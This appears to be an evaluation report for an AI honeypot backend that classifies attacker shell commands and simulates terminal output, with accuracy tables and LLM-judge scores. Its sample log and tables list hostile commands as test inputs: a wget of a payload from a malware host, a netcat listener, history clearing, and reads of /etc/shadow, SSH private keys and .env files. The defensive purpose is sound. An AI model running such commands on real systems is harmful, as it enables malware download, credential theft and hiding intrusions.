# Xynera AI Backend Evaluation Report

This report summarizes the performance evaluation of the Xynera AI Backend across Classification Accuracy, Retrieval Precision, and Response Quality.

- **Timestamp**: 2026-07-02 17:00:48
- **Total Commands Tested**: 61
- **Semantic Retrieval Queries Tested**: 5
- **Total Generations Evaluated**: 14

---

## 📊 Summary of Metrics

| Metric Category | Metric Name | Value | Description |
| :--- | :--- | :--- | :--- |
| **Classification** | Overall Accuracy | `100.00%` | Correct classification of command threat classes |
| **Retrieval** | Overall Accuracy | `100.00%` | Retrieval of correct KB doc or `None` if out-of-scope |
| **Response Quality** | Avg Latency | `9.06s` | Time taken to generate simulation output |
| | No Markdown Code Blocks | `100.00%` | % of outputs without forbidden ``` wrapper |
| | No Conversational Fluff | `100.00%` | % of outputs free of apologies/preambles |
| | No Prompt Leakage | `100.00%` | % of outputs without unstripped bash prompts |
| | Parameter Adaptation | `92.86%` | % of outputs successfully substituting command args |
| **LLM-as-a-Judge** | Avg Realism | `7.79 / 10` | Realism score from Llama-3.1-8b evaluator |
| | Avg Adherence | `8.57 / 10` | simulation rules adherence (no meta-text/conversational text) |
| | Avg Consistency | `9.14 / 10` | Logical alignment with flags/inputs |

---

## 🔍 Detail: Classification Performance

### Class-Wise Metrics
| Class Name | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| Defense Evasion | 100.00% | 100.00% | 1.00 |
| Malware Download Attempt | 100.00% | 100.00% | 1.00 |
| Malware Execution Attempt | 100.00% | 100.00% | 1.00 |
| Permission Manipulation | 100.00% | 100.00% | 1.00 |
| Persistence Creation | 100.00% | 100.00% | 1.00 |
| Privilege Escalation Attempt | 100.00% | 100.00% | 1.00 |
| Reconnaissance | 100.00% | 100.00% | 1.00 |
| Reverse Shell Attempt | 100.00% | 100.00% | 1.00 |
| SQL Injection Attempt | 100.00% | 100.00% | 1.00 |
| Unknown | 100.00% | 100.00% | 1.00 |

### Classification Failures & Misclassifications
*None! The command classifier performed perfectly.*

---

## 🔍 Detail: Retrieval Performance

### Document-Wise/Class-Wise Metrics
| Target KB Command | Precision | Recall | F1-Score |
| :--- | :---: | :---: | :---: |
| None | 100.00% | 100.00% | 1.00 |
| cat /etc/gateway/router.conf | 100.00% | 100.00% | 1.00 |
| cat /etc/shadow | 100.00% | 100.00% | 1.00 |
| cat /home/dev/backup_status.txt | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.env | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.ssh/backup_key | 100.00% | 100.00% | 1.00 |
| cat /home/ubuntu/.ssh/id_rsa | 100.00% | 100.00% | 1.00 |
| cat /var/www/internal/db_backup.sql | 100.00% | 100.00% | 1.00 |
| cat /var/www/internal/dev_tasks.md | 100.00% | 100.00% | 1.00 |
| chmod | 100.00% | 100.00% | 1.00 |
| crontab | 100.00% | 100.00% | 1.00 |
| curl | 100.00% | 100.00% | 1.00 |
| df | 100.00% | 100.00% | 1.00 |
| dmesg | 100.00% | 100.00% | 1.00 |
| docker | 100.00% | 100.00% | 1.00 |
| env | 100.00% | 100.00% | 1.00 |
| find | 100.00% | 100.00% | 1.00 |
| free | 100.00% | 100.00% | 1.00 |
| grep | 100.00% | 100.00% | 1.00 |
| history | 100.00% | 100.00% | 1.00 |
| hostname | 100.00% | 100.00% | 1.00 |
| id | 100.00% | 100.00% | 1.00 |
| ifconfig | 100.00% | 100.00% | 1.00 |
| ip | 100.00% | 100.00% | 1.00 |
| iptables | 100.00% | 100.00% | 1.00 |
| last | 100.00% | 100.00% | 1.00 |
| ls | 100.00% | 100.00% | 1.00 |
| lsb_release | 100.00% | 100.00% | 1.00 |
| lscpu | 100.00% | 100.00% | 1.00 |
| nc | 100.00% | 100.00% | 1.00 |
| netcat | 100.00% | 100.00% | 1.00 |
| netstat | 100.00% | 100.00% | 1.00 |
| nmap | 100.00% | 100.00% | 1.00 |
| ping | 100.00% | 100.00% | 1.00 |
| ps | 100.00% | 100.00% | 1.00 |
| ss | 100.00% | 100.00% | 1.00 |
| systemctl | 100.00% | 100.00% | 1.00 |
| top | 100.00% | 100.00% | 1.00 |
| uname | 100.00% | 100.00% | 1.00 |
| uptime | 100.00% | 100.00% | 1.00 |
| w | 100.00% | 100.00% | 1.00 |
| wget | 100.00% | 100.00% | 1.00 |
| which | 100.00% | 100.00% | 1.00 |
| whoami | 100.00% | 100.00% | 1.00 |

### Retrieval Failures
*None! The retrieval engine found the correct documents perfectly.*

---

## 🔍 Detail: Response Quality & Simulation Realism

### Sample Generation Log & Scores
| Command | Latency | Code Blocks | No Fluff | No Prompt | Adaptation | Realism | Adherence | Consistency | Judge Feedback |
| :--- | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :---: | :--- |
| `nmap -sS -v 192.168.1.1` | 1.17s | ✅ | ✅ | ✅ | ✅ | 9 | 9 | 10 | The output is very realistic, but the 'target' in the reference output is replaced with '192.168.1.1' in the AI response, which is a minor deviation. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, including the flags, arguments, and IP address. |
| `wget http://malware.sh/payload.sh` | 0.85s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is very realistic and matches the reference document. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, including the IP address and filename. |
| `chmod 777 /var/www/html/uploads` | 13.01s | ✅ | ✅ | ✅ | ❌ | 8 | 9 | 10 | The output is mostly realistic, but it's missing the actual file modification time and ownership information that would be present in a real terminal. The AI did a good job of avoiding conversational fluff and explanations, but it could be improved by adding some minor details to make the output more authentic. The response is logically consistent with the command executed. |
| `nc -lvp 4444` | 20.53s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is mostly realistic, but it lacks the exact wording and formatting of a real Linux terminal. The AI response is concise and does not contain any conversational fluff or explanations. The output is logically consistent with the command executed, including the flags and port number. |
| `history -c` | 10.65s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it lacks the exact formatting of the reference document. The AI response is concise and does not contain any conversational fluff or explanations. The response is logically consistent with the command executed, as 'history -c' is used to clear the command history. |
| `crontab -e` | 12.38s | ✅ | ✅ | ✅ | ✅ | 0 | 0 | 0 | The generated AI response is completely unrealistic and unrelated to the command 'crontab -e'. The output is a repetitive and nonsensical sequence of visudo error messages. This suggests a complete failure of the AI to understand the context and execute the command correctly. The output contains no conversational fluff, but it is not a perfect terminal output due to its complete irrelevance to the command. The response is also logically inconsistent with the command executed, as crontab -e has nothing to do with visudo or sudoers. |
| `find / -perm -4000 -type f 2>/dev/null` | 22.50s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 9 | The output is mostly realistic, but the file permissions and types match the command, however, the output for /var/www/internal/dev_tasks.md seems unusual for a user's home directory. The AI did a good job avoiding conversational fluff and explanations, but the output for /home/ubuntu/.ssh/id_rsa is not typical for a user's home directory. The response is logically consistent with the command executed. |
| `ps aux` | 16.69s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it lacks the header line 'USER       PID %CPU %MEM COMMAND' which is typically present in the output of the 'ps aux' command. The AI response is free of any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed. |
| `netstat -antp` | 17.42s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 9 | The output is mostly realistic, but the inclusion of 'Recv-Q' and 'Send-Q' columns is not typical for the 'netstat -antp' command. A real 'netstat -antp' command would usually display the PID/Program name in the format 'PID/Program name' without spaces. The AI response is mostly free of conversational fluff, but the inclusion of '0.0.0.0:*' in the foreign address column is not necessary and can be omitted. The response is logically consistent with the command executed. |
| `ping -c 4 8.8.8.8` | 11.62s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it lacks the initial PING line with the hostname and IP address. The adherence is high because the output is mostly plain text without any explanations or code blocks. The consistency is perfect because the output matches the command executed, including the number of packets sent and received. |
| `cat /home/ubuntu/.ssh/id_rsa` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is almost identical to the reference, with the correct OpenSSH private key format. However, it's missing the actual file contents, which would be the private key data. The AI response is perfect in terms of adherence, as it doesn't contain any conversational fluff or explanations. The consistency is also perfect, as the response matches the command executed. |
| `cat /home/ubuntu/.env` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 10 | 10 | The output is very realistic and matches the reference document. The AI avoided any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks. The response is logically consistent with the command executed, and the output is well-formatted. |
| `mkdir /tmp/test` | 0.00s | ✅ | ✅ | ✅ | ✅ | 8 | 9 | 10 | The output is very realistic, but it's missing the 'No knowledge base document matched. Expected command not found fallback' prefix. The AI response is mostly clean, but it could be improved by removing the colon at the end. The response is logically consistent with the command executed. |
| `pwd` | 0.00s | ✅ | ✅ | ✅ | ✅ | 9 | 9 | 10 | The output is very realistic, but it's missing the 'No knowledge base document matched' message that would be present in a real scenario where the command is not found. The adherence is high because the output is a direct response without any explanations or code blocks. The consistency is perfect because the response is logically consistent with the command executed. |
